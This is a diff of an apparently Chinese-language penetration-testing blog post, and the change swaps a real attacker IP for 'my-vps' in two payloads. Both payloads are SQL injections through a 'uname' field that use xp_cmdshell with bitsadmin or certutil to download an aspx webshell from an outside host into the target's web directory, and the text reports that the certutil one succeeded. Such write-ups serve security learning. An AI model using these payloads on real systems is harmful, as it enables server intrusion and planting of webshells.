@@ -265,12 +265,12 @@ D:\WEBAPP\Content\layer\
 
 <p>使用bitsadmin下载时并没有成功，访问<code>http://111.*.*.59/Content/layer/aaa.aspx</code>返回404</p>
 
-<pre><code class="language-sql">uname=test';exec master..xp_cmdshell 'bitsadmin /rawreturn /transfer getfile http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
+<pre><code class="language-sql">uname=test';exec master..xp_cmdshell 'bitsadmin /rawreturn /transfer getfile http://my-vps/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
 </code></pre>
 
 <p>使用certutil下载时才成功，得到shell地址<code>http://111.*.*.59/Content/layer/aaa.aspx</code></p>
 
-<pre><code class="language-sql">uname=test';exec master..xp_cmdshell 'certutil -urlcache -split -f http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
+<pre><code class="language-sql">uname=test';exec master..xp_cmdshell 'certutil -urlcache -split -f http://my-vps/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
 </code></pre>
 
 <p><img src="/img/post/Xnip2019-03-03_20-42-24.png" alt="70" /></p>
